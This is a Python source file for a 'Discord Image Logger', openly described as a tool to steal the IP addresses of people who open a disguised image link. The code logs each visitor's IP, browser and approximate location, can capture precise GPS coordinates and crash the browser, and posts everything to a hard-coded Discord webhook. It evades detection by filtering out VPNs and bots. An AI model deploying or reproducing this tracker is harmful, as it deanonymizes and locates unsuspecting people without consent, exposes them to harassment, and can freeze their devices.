# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1334794326114570313/s_WuEC5Uz_e-0l32VOCGO_tAl_tez299PwPreVfjOR-i4zBMBh_sJlEO4EKF-VxAWj25",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
